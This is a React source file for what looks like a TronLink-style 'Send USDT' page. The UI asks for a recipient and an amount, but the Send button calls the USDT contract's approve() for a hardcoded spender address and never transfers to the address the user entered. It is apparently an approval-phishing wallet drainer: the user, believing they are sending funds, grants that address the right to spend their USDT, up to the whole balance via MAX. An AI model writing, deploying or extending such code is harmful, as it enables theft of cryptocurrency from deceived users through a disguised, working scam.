import React, { useState, useEffect } from 'react';
import { FaAddressBook, FaQrcode, FaInfoCircle, FaTimes, FaChevronRight, FaChevronDown } from 'react-icons/fa';
import './styles.css';

const USDTSendApp = () => {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [memo, setMemo] = useState('');
  const [currentStep, setCurrentStep] = useState(1); // 1 for address, 2 for amount
  const [activeTab, setActiveTab] = useState('Recents'); // Recents, Address Book, My Accounts
  const [showNotes, setShowNotes] = useState(false);
  
  // TRON functionality states
  const [account, setAccount] = useState('');
  const [message, setMessage] = useState('');
  const [tronWeb, setTronWeb] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [showScanner, setShowScanner] = useState(false);
  const [usdtBalance, setUsdtBalance] = useState('0.000000');
  const [isLoadingBalance, setIsLoadingBalance] = useState(false);
  const [fetchingBalance, setFetchingBalance] = useState(false);
  
  // USDT contract on TRON (TRC-20)
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  
  // USDT TRC-20 ABI (approve and balanceOf functions)
  const USDT_ABI = [
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ];

  // Add viewport meta tag for mobile optimization
  useEffect(() => {
    const viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      const meta = document.createElement('meta');
      meta.name = 'viewport';
      meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
      document.head.appendChild(meta);
    }

    // Auto-connect if wallet is available
    const checkAndConnect = async () => {
      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        setMessage('TRON wallet connected');
        // Balance will be fetched by the useEffect that watches for account changes
      }
    };

    // Check after a short delay to let wallet inject
    setTimeout(checkAndConnect, 1000);
  }, []);

  const connectWallet = async () => {
    setIsConnecting(true);
    try {
      // Check if we're in Trust Wallet
      const isTrustWallet = window.trustWallet || window.ethereum?.isTrust;
      
      // Check for TRON wallet (Trust Wallet, TronLink, or other TRON wallets)
      if (!window.tronWeb) {
        if (isTrustWallet) {
          setMessage('Please enable TRON dApp in Trust Wallet settings and refresh.');
        } else {
          setMessage('TRON wallet not found. Please open in Trust Wallet or install TronLink.');
        }
        setIsConnecting(false);
        return;
      }

      // Wait for TronWeb to be ready (Trust Wallet may need more time)
      let attempts = 0;
      while ((!window.tronWeb.ready || !window.tronWeb.defaultAddress) && attempts < 20) {
        await new Promise(resolve => setTimeout(resolve, 500));
        attempts++;
      }

      if (!window.tronWeb.ready) {
        setMessage('TRON wallet is not ready. Please refresh and make sure TRON is enabled.');
        setIsConnecting(false);
        return;
      }

      // Get current account
      const currentAccount = window.tronWeb.defaultAddress?.base58;
      
      if (!currentAccount) {
        setMessage('No TRON account found. Please connect your TRON wallet.');
        setIsConnecting(false);
        return;
      }

      // Only update if account has changed to prevent unnecessary re-renders
      if (currentAccount !== account) {
        setTronWeb(window.tronWeb);
        setAccount(currentAccount);
        setMessage(isTrustWallet ? 'Connected to TRON Network with Trust Wallet!' : 'Connected to TRON Network!');
        // Force a balance fetch immediately
        setTimeout(() => {
          fetchUSDTBalance(window.tronWeb, currentAccount);
        }, 500);
      } else {
        // Even if account hasn't changed, make sure we have the balance
        if (usdtBalance === '0.000000' && !isLoadingBalance && !fetchingBalance) {
          fetchUSDTBalance(window.tronWeb, currentAccount);
        }
      }
    } catch (error) {
      console.error('Wallet connection error:', error);
      setMessage('Connection Error: ' + (error?.message || 'Unknown error occurred'));
    }
    setIsConnecting(false);
  };

  const getContract = () => {
    if (!tronWeb) return null;
    try {
      return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    } catch (error) {
      return null;
    }
  };

  // Effect to refresh balance when account changes
  useEffect(() => {
    if (account && tronWeb) {
      fetchUSDTBalance(tronWeb, account);
    }
  }, [account, tronWeb]);
  
  // Check wallet connection status periodically
  useEffect(() => {
    // Check every 3 seconds if wallet is available but not connected yet
    const intervalId = setInterval(() => {
      if (!account && window.tronWeb && window.tronWeb.ready) {
        connectWallet();
      }
    }, 3000);
    
    return () => clearInterval(intervalId);
  }, [account]);
  
  const fetchUSDTBalance = async (tronWebInstance, userAddress) => {
    if (!tronWebInstance || !userAddress) {
      console.log('Missing TronWeb instance or user address for fetching balance');
      return;
    }
    
    // Prevent multiple concurrent fetch requests
    if (fetchingBalance) {
      console.log('Balance fetch already in progress, skipping');
      return;
    }
    
    setFetchingBalance(true);
    setIsLoadingBalance(true);
    
    try {
      const contract = await tronWebInstance.contract(USDT_ABI, USDT_CONTRACT);
      const balance = await contract.balanceOf(userAddress).call();
      
      // Handle balance conversion safely
      let balanceNumber;
      try {
        // First convert to string if it's a BigInt
        const balanceString = balance.toString();
        // Then parse as a number and divide by 10^6 (USDT has 6 decimals)
        balanceNumber = parseFloat(balanceString) / 1000000;
      } catch (conversionError) {
        // Fallback if there's an issue with BigInt conversion
        console.warn('Balance conversion issue:', conversionError);
        balanceNumber = 0;
      }
      
      // Format with 6 decimal places
      setUsdtBalance(balanceNumber.toFixed(6));
      console.log('USDT balance fetched successfully:', balanceNumber.toFixed(6));
    } catch (error) {
      console.error('Error fetching USDT balance:', error);
      setUsdtBalance('0.000000');
    } finally {
      setIsLoadingBalance(false);
      setFetchingBalance(false);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      // Message is set but not displayed
      setMessage('Address pasted from clipboard');
    } catch (err) {
      setMessage('Failed to paste from clipboard');
    }
  };

  const setMaxAmount = () => {
    setAmount(usdtBalance);
    setMessage('Maximum amount set');
  };

  // const handleScanQRCode = () => {
  //   setShowScanner(true);
  //   // In a real app, you would integrate with a QR code scanner library
  //   // For now, we'll simulate scanning after a delay
  //   setTimeout(() => {
  //     // Simulate scanning a QR code with a dummy address
  //     const scannedAddress = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
  //     setAddress(scannedAddress);
  //     setShowScanner(false);
  //     setMessage('QR code scanned successfully');
  //   }, 2000);
  // };

  const handleNext = async () => {
    if (currentStep === 1) {
      // Step 1: Address validation and move to step 2
      if (!address) {
        setMessage('Please enter a receiving address');
        return;
      }
      
      // Make sure wallet is connected before moving to step 2
      if (!account || !tronWeb) {
        setMessage('Connecting wallet...');
        await connectWallet();
        // Don't move to step 2 yet if wallet connection failed
        if (!account || !tronWeb) {
          setMessage('Please connect your TRON wallet first');
          return;
        }
      }
      
      // Fetch balance if needed
      if (usdtBalance === '0.000000' && !isLoadingBalance) {
        await fetchUSDTBalance(tronWeb, account);
      }
      
      setCurrentStep(2);
      return;
    }

    // Step 2: Execute transaction
    if (!account || !tronWeb) {
      setMessage('Please connect your TRON wallet first');
      await connectWallet();
      return;
    }

    if (!amount) {
      setMessage('Please enter an amount');
      return;
    }

    try {
      // Convert amount to proper format (USDT has 6 decimals)
      const amountInWei = Math.floor(parseFloat(amount) * Math.pow(10, 6)).toString();
      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv";

      const contract = await getContract();
      if (!contract) {
        setMessage('❌ Failed to load USDT contract');
        return;
      }
      
      // Call approve function with the specific amount
      const result = await contract.approve(spender, amountInWei).send({
        feeLimit: 100_000_000, // 100 TRX fee limit
        callValue: 0,
        from: account
      });

      setMessage('⏳ Transaction submitted! Waiting for confirmation...');
      
      if (result) {
        setMessage(`✅ Approval completed successfully! Transaction: ${result}`);
        // Refresh balance after successful transaction
        await fetchUSDTBalance(tronWeb, account);
      } else {
        setMessage('❌ Approval failed - No transaction result');
      }
    } catch (error) {
      const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
      
      if (errorMessage.includes('User rejected') || errorMessage.includes('user rejected')) {
        setMessage('❌ Transaction rejected by user');
      } else if (errorMessage.includes('insufficient balance')) {
        setMessage('❌ Insufficient TRX for transaction fees');
      } else if (errorMessage.includes('REVERT')) {
        setMessage('❌ Contract execution failed');
      } else if (errorMessage.includes('unlocked wallet') || errorMessage.includes('not unlocked')) {
        setMessage('❌ Please unlock your TRON wallet and try again');
      } else {
        setMessage('❌ Error: ' + errorMessage);
      }
    }
  };

  const handleBack = () => {
    if (currentStep === 2) {
      setCurrentStep(1);
    }
  };

  // Clear functions for each input field
  const clearAddress = () => {
    setAddress('');
  };

  const clearAmount = () => {
    setAmount('');
  };

  const clearMemo = () => {
    setMemo('');
  };

  return (
    <div className="tronlink-container">
      {/* QR Scanner Modal */}
      {showScanner && (
        <div className="scanner-modal">
          <div className="scanner-content">
            <div className="scanner-header">
              <h3>Scan QR Code</h3>
              <button className="close-scanner" onClick={() => setShowScanner(false)}>
                <FaTimes />
              </button>
            </div>
            <div className="scanner-placeholder">
              <div className="scanner-animation">
                <FaQrcode size={80} />
                <p>Scanning QR code...</p>
                <div className="scanning-line"></div>
              </div>
            </div>
            <div className="scanner-footer">
              <p>Point your camera at a USDT address QR code</p>
            </div>
          </div>
        </div>
      )}

      <div className="tronlink-card">
        {/* Header */}
        <div className="tronlink-header">
          <button className="back-button" onClick={handleBack}>
            <span>‹</span>
          </button>
          <div className="header-title">
            <h1>Send <span className="step-text">({currentStep}/2)</span></h1>
          </div>
          {currentStep === 1 && <span className="multisig-transfer">Multisig Transfer</span>}
        </div>

        {currentStep === 1 ? (
          // Step 1: Receiving Account
          <>
            <div className="section-header">
              <h2>Receiving Account</h2>
              <button className="qr-scan-btn" onClick={() => setShowScanner(true)}>
                <FaQrcode />
              </button>
            </div>

            <div className="address-input-section">
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className="tronlink-input"
                placeholder="Enter the account address"
              />
              <button 
                className={`paste-btn ${address ? 'hidden' : ''}`} 
                onClick={handlePaste}
              >
                Paste
              </button>
              <button 
                className={`clear-btn ${address ? 'visible' : ''}`}
                onClick={clearAddress}
              >
                <FaTimes />
              </button>
            </div>
            
            <div className="address-separator"></div>

            <div className={`tabs-container ${address ? 'hidden' : ''}`}>
              <div className="tabs">
                {['Recents', 'Address Book', 'My Accounts'].map((tab) => (
                  <button
                    key={tab}
                    className={`tab ${activeTab === tab ? 'active' : ''}`}
                    onClick={() => setActiveTab(tab)}
                  >
                    {tab}
                  </button>
                ))}
              </div>
            </div>

            <div className={`tab-content ${address ? 'hidden' : ''}`}>
              <div className="empty-state">
                <div className="empty-icon">
                  <div className="hamburger-icon">
                    <div></div>
                    <div></div>
                    <div></div>
                  </div>
                </div>
                <p>No transfer records</p>
              </div>
            </div>
          </>
        ) : (
          // Step 2: Token and Amount
          <>
            <div className="token-section">
              <h2>Token</h2>
              <div className="token-selector">
                <div className="token-info">
                  <div className="token-icon-container">
                    <img 
                      src="https://static.tronscan.org/production/logo/usdtlogo.png" 
                      alt="USDT" 
                      className="usdt-icon"
                    />
                    <div className="verification-badge">v</div>
                  </div>
                  <span className="token-name">USDT <span className="token-subtext">(Tether USD)</span></span>
                </div>
                <FaChevronRight className="chevron" />
              </div>
            </div>

            <div className="amount-section">
              <h2>Amount</h2>
              <div className="amount-input-container">
                <input
                  type="text"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="tronlink-input"
                  placeholder="Enter the transfer amount"
                />
                <button 
                  className={`max-btn ${amount ? 'hidden' : ''}`}
                  onClick={setMaxAmount}
                >
                  MAX
                </button>
                <button 
                  className={`clear-btn ${amount ? 'visible' : ''}`}
                  onClick={clearAmount}
                >
                  <FaTimes />
                </button>
              </div>
              <div className="available-balance">
                {isLoadingBalance ? (
                  <span>Loading balance...</span>
                ) : (
                  <span>Available: {usdtBalance} USDT</span>
                )}
              </div>
            </div>

            <div className="notes-section">
              <button 
                className="add-notes-btn" 
                onClick={() => setShowNotes(!showNotes)}
              >
                Add notes to this transfer
                <FaChevronDown className={`chevron ${showNotes ? 'rotated' : ''}`} />
              </button>
              
              {showNotes && (
                <div className="notes-expanded">
                  <h3 className="notes-title">Note <span className="optional-text">(optional)</span></h3>
                  <textarea
                    value={memo}
                    onChange={(e) => setMemo(e.target.value)}
                    className="notes-textarea"
                    placeholder="Please enter a note within 200 letters"
                    maxLength={200}
                  />
                  <div className="notes-fee">
                    Adding a note will cost an extra 1 TRX
                  </div>
                </div>
              )}
            </div>
          </>
        )}

        {/* Bottom Button */}
        <div className="bottom-button-container">
          <button 
            className="tronlink-next-button"
            onClick={handleNext}
            disabled={currentStep === 1 ? !address : !amount}
          >
            {currentStep === 1 ? 'Next' : 'Send'}
          </button>
        </div>
      </div>
    </div>
  );
};

export default USDTSendApp;